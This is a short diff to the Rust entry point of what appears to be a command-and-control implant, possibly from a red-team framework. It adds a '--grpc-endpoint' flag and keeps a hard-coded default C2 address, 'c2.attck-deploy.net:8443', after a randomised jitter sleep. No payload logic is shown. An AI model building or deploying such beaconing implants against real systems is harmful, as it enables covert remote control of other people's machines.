@@ -32,15 +32,20 @@ async fn main() -> Result<()> {
     let jitter = rand::random::<u64>() % 30 + 10;
     sleep(Duration::from_secs(jitter)).await;
 
-    // Parse command line arguments or use primary domain from configuration
+    // Parse command line arguments with proper flag handling
     let args: Vec<String> = env::args().collect();
-    let server_addr = if args.len() > 1 {
-        args[1].clone()
-    } else {
-        // Use primary domain from configuration with gRPC port
-        // Primary domains from nexus.toml: ["c2.attck-deploy.net", "api.attck-deploy.net"]
-        "https://c2.attck-deploy.net:8443".to_string()
-    };
+    let mut server_addr = "https://c2.attck-deploy.net:8443".to_string(); // Use 8443 to match server config
+    
+    // Parse --grpc-endpoint flag properly
+    for i in 1..args.len() {
+        if args[i] == "--grpc-endpoint" && i + 1 < args.len() {
+            server_addr = args[i + 1].clone();
+            break;
+        }
+    }
+
+    #[cfg(debug_assertions)]
+    println!("Connecting to server: {}", server_addr);
 
     // Create encryption key (in production, this should be embedded or derived)
     let encryption_key = [
